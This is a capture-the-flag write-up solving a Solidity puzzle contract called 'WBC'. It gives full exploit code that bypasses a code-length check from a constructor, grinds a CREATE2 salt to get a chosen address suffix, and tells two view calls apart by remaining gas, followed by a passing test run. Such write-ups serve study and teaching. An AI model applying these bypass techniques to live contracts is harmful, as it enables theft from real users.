# Challenge - WBC

## Objective of CTF

To solve this challenge, you need to score in the `WBC` contract by setting the `scored` variable to `true`.

## Vulnerability Analysis

There are two ways to set the `scored` variable to true: by executing either the `homerun()` function or the `_homeBase()` function.

```solidity
function homerun() external {
    require(block.timestamp % 23_03_2023 == 0, "try again");
    scored = true;
}
```

The `homerun()` function can only be executed successfully when `block.timestamp` is divisible by `23_03_2023` (approximately 266 days). This makes it impractical to rely on `homerun()` as a viable solution.

A more feasible approach is to set the `scored` to `true` by reaching `_homeBase()` through the `ready()` function.

Here's our plan:

1. Implement a `Player` contract to successfully execute the `ready()` function.
2. Call the `bodyCheck()` function to set the `player` variable to our `Player` contract.
3. Call the `ready()` function, which will ultimately set scored to true.

```solidity
function bodyCheck() external {
    require(msg.sender.code.length == 0, "no personal stuff");
    require(uint256(uint160(msg.sender)) % 100 == 10, "only valid players");

    player = msg.sender;
}
```

To satisfy the `bodyCheck()` function `require` statements:

1. Call `bodyCheck()` in the constructor of the `Player` contract. During contract creation, the contract size is 0, which bypasses the `msg.sender.code.length == 0` check.

2. Deploy the `Player` contract using `CREATE2` with a specific `salt` to ensure that the contract address satisfies `uint256(uint160(msg.sender)) % 100 == 10`.

```solidity
// Player contract
constructor(address _wbc) {
    wbc = WBC(_wbc);
    wbc.bodyCheck();
}
```

The way to find a `salt` to deploy the `Player` contract to the specific contract address:

```solidity
Player p;
for (uint256 i;; ++i) {
    address addr = computeCreate2Address(bytes32(i), bytecode);

    if (uint256(uint160(addr)) % 100 == 10) {
        p = new Player{salt: bytes32(i)}(address(wbc));
        break;
    }
}
```

For the `ready()` function, implement a `judge()` function to return the `block.coinbase`, which will match the `judge` in the `WBC` contract:

```solidity
function ready() external {
    require(IGame(msg.sender).judge() == judge, "wrong game");
    _swing();
}

function _swing() internal onlyPlayer {
    _firstBase();
    require(scored, "failed");
}
```

```solidity
// Player contract
function judge() external view returns (address) {
    return block.coinbase;
}
```

For the `_secondBase()` function, implement a `steal()` function to return a specific computed value:

```solidity
function _firstBase() internal {
    uint256 o0o0o0o00oo00o0o0o0o0o0o0o0o0o0o0o0oo0o = 1001000030000000900000604030700200019005002000906;
    uint256 o0o0o0o00o0o0o0o0o0o0o0ooo0o00o0ooo000o = 460501607330902018203080802016083000650930542070;
    uint256 o0o0o00o0oo00oo00o0o0o0o0o0o0o0o0oo0o0o = 256; // 2^8
    uint256 o0oo0o0o0o0o0o0o0o0o00o0oo00o0o0o0o0o0o = 1;
    _secondBase(
        uint160(
            o0o0o0o00oo00o0o0o0o0o0o0o0o0o0o0o0oo0o
                + o0o0o0o00o0o0o0o0o0o0o0ooo0o00o0ooo000o * o0o0o00o0oo00oo00o0o0o0o0o0o0o0o0oo0o0o
                - o0oo0o0o0o0o0o0o0o0o00o0oo00o0o0o0o0o0o
        )
    );
}

function _secondBase(uint160 input) internal {
    require(IGame(msg.sender).steal() == input, "out");
    _thirdBase();
}
```

```solidity
// Player contract
function steal() external view returns (uint256) {
    uint256 o0o0o0o00oo00o0o0o0o0o0o0o0o0o0o0o0oo0o = 1001000030000000900000604030700200019005002000906;
    uint256 o0o0o0o00o0o0o0o0o0o0o0ooo0o00o0ooo000o = 460501607330902018203080802016083000650930542070;
    uint256 o0o0o00o0oo00oo00o0o0o0o0o0o0o0o0oo0o0o = 256; // 2^8
    uint256 o0oo0o0o0o0o0o0o0o0o00o0oo00o0o0o0o0o0o = 1;

    return uint160(
        o0o0o0o00oo00o0o0o0o0o0o0o0o0o0o0o0oo0o
            + o0o0o0o00o0o0o0o0o0o0o0ooo0o00o0ooo000o * o0o0o00o0oo00oo00o0o0o0o0o0o0o0o0oo0o0o
            - o0oo0o0o0o0o0o0o0o0o00o0oo00o0o0o0o0o0o
    );
}
```

For the `_thirdBase()` function, implement a `execute()` function to return a 32-bytes hex-string represents "HitAndRun".

```solidity
function decode(bytes32 data) external pure returns (string memory) {
    assembly {
        mstore(0x20, 0x20)
        mstore(0x49, data)
        return(0x20, 0x60)
    }
}

function _thirdBase() internal {
    require(keccak256(abi.encodePacked(this.decode(IGame(msg.sender).execute()))) == keccak256("HitAndRun"), "out");
    _homeBase();
}
```

Here, we use the `chisel` tool to inspect how the "HitAndRun" string is represented in EVM memory:

```
╰─ chisel
─╯
Welcome to Chisel! Type `!help` to show available commands.
➜ "HitAndRun"
Type: string
├ UTF-8: HitAndRun
├ Hex (Memory):
├─ Length ([0x00:0x20]): 0x0000000000000000000000000000000000000000000000000000000000000009
├─ Contents ([0x20:..]): 0x486974416e6452756e0000000000000000000000000000000000000000000000
├ Hex (Tuple Encoded):
├─ Pointer ([0x00:0x20]): 0x0000000000000000000000000000000000000000000000000000000000000020
├─ Length ([0x20:0x40]): 0x0000000000000000000000000000000000000000000000000000000000000009
└─ Contents ([0x40:..]): 0x486974416e6452756e0000000000000000000000000000000000000000000000
```

As shown, the "HitAndRun" string is stored in two parts:

1. 0x0000000000000000000000000000000000000000000000000000000000000009 -> represents the length of the "HitAndRun" string (i.e., 9)
2. 0x486974416e6452756e0000000000000000000000000000000000000000000000 -> "HitAndRun" string in hexadecimal bytes string

In the `decode()` function we store the `data` from index `0x49`. Therefore the final output with the leading zeros will be:

`0000000000000000000000000000000000000000000009486974416E6452756E`

For the `_homeBase()` function, implement a `shout()` function that returns a bytes string, will be decoded as a `string` type.

The `homeBase()` function is required to output the string "I'm the best" when we call the `shout()` function for the first time, and "We are the champion!" when we call it the second time.

However, the `shout()` function must be declared as a `view` function, which means we cannot modify the contract's state. As a result, we are not allowed to use a variable to differentiate between the first and second static calls.

The only way to distinguish between the first and second calls is by tracking the remaining gas (e.g. `gasleft()`), which lets us measure the difference in gas between calls. We can record the remaining gas in the `execute()` function and, by comparing it with the current remaining gas, find a threshold to identify whether it’s the first or second call.

```solidity
function _homeBase() internal {
    scored = true;

    (bool succ, bytes memory data) = msg.sender.staticcall(abi.encodeWithSignature("shout()"));
    require(succ, "out");
    require(
        keccak256(abi.encodePacked(abi.decode(data, (string)))) == keccak256(abi.encodePacked("I'm the best")),
        "out"
    );

    (succ, data) = msg.sender.staticcall(abi.encodeWithSignature("shout()"));
    require(succ, "out");
    require(
        keccak256(abi.encodePacked(abi.decode(data, (string))))
            == keccak256(abi.encodePacked("We are the champion!")),
        "out"
    );
}
```

```solidity
// Player contract
function execute() external returns (bytes32) {
    remainingGas = gasleft();
    return hex"0000000000000000000000000000000000000000000009486974416E6452756E";
}

function shout() external view returns (bytes memory) {
    if (remainingGas - gasleft() < 25000) { // 25000 is the threshold to determine the first call or the second call
        return abi.encodePacked("I'm the best");
    } else {
        return abi.encodePacked("We are the champion!");
    }
}
```

### Attack steps:

1. Implement a `Player` contract that has four function: `judge()`, `steal()`, `execute()` and `shout()`. These functions must be implemented to satisfy the conditions required by the WBC contract when executing the `ready()` function
2. Find a `salt` that, when used with the `CREATE2` opcode, results in deploying the `Player` contract at an address with a specific suffix.
3. Call the `bodyCheck()` in the constructor function of the `Player` contract.
4. Trigger the `ready()` function.

## PoC test case

### Attack Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {WBC} from "src/WBC/WBC.sol";

interface IGame {
    function judge() external view returns (address);
    function steal() external view returns (uint256);
    function execute() external returns (bytes32);
    function shout() external view returns (bytes memory);
}

contract Player is IGame {
    uint256 remainingGas;
    WBC private immutable wbc;

    constructor(address _wbc) {
        wbc = WBC(_wbc);
        wbc.bodyCheck();
    }

    function attack() external {
        wbc.ready();
    }

    function judge() external view returns (address) {
        return 0x0000000000000000000000000000000000000000;
    }

    function steal() external view returns (uint256) {
        uint256 o0o0o0o00oo00o0o0o0o0o0o0o0o0o0o0o0oo0o = 1001000030000000900000604030700200019005002000906;
        uint256 o0o0o0o00o0o0o0o0o0o0o0ooo0o00o0ooo000o = 460501607330902018203080802016083000650930542070;
        uint256 o0o0o00o0oo00oo00o0o0o0o0o0o0o0o0oo0o0o = 256; // 2^8
        uint256 o0oo0o0o0o0o0o0o0o0o00o0oo00o0o0o0o0o0o = 1;

        return uint160(
            o0o0o0o00oo00o0o0o0o0o0o0o0o0o0o0o0oo0o
                + o0o0o0o00o0o0o0o0o0o0o0ooo0o00o0ooo000o * o0o0o00o0oo00oo00o0o0o0o0o0o0o0o0oo0o0o
                - o0oo0o0o0o0o0o0o0o0o00o0oo00o0o0o0o0o0o
        );
    }

    function execute() external returns (bytes32) {
        remainingGas = gasleft();
        return hex"0000000000000000000000000000000000000000000009486974416E6452756E";
    }

    function shout() external view returns (bytes memory) {
        if (remainingGas - gasleft() < 25000) {
            return abi.encodePacked("I'm the best");
        } else {
            return abi.encodePacked("We are the champion!");
        }
    }
}
```

### Test contract

```solidity
function testExploit() external {
    bytes32 bytecode = keccak256(abi.encodePacked(type(Player).creationCode, uint256(uint160(address(wbc)))));

    Player p;
    for (uint256 i;; ++i) {
        address addr = computeCreate2Address(bytes32(i), bytecode);

        if (uint256(uint160(addr)) % 100 == 10) {
            p = new Player{salt: bytes32(i)}(address(wbc));
            break;
        }
    }

    p.attack();
}
```

### Test Result

```
Ran 1 test for test/WBC.t.sol:WBCTest
[PASS] testExploit() (gas: 322522)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.58ms (1.40ms CPU time)

Ran 1 test suite in 232.20ms (7.58ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
